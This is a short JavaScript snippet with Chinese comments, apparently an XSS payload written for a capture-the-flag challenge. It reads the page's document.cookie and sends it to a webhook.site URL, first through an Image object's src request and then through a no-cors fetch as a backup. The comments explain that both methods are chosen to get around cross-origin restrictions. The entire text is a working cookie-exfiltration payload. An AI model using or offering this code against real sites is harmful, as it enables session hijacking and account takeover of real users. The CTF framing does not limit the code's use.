// 你的 Webhook 接收地址
var webhookUrl = "https://webhook.site/317cc916-ee20-43cf-9f91-3b0860b9558c";

// 获取当前页面（也就是 CTF 题目网站）的 Cookie
var cookieData = document.cookie;

// 方法 1：使用 Image 对象发送请求（最经典、最不容易受跨域 CORS 限制的方法）
var img = new Image();
img.src = webhookUrl + "?cookie=" + encodeURIComponent(cookieData);

// 方法 2：或者使用 fetch 发送请求 (备用)
fetch(webhookUrl + "?cookie=" + encodeURIComponent(cookieData), {
    mode: 'no-cors' // 声明 no-cors 防止浏览器因跨域拦截请求
});

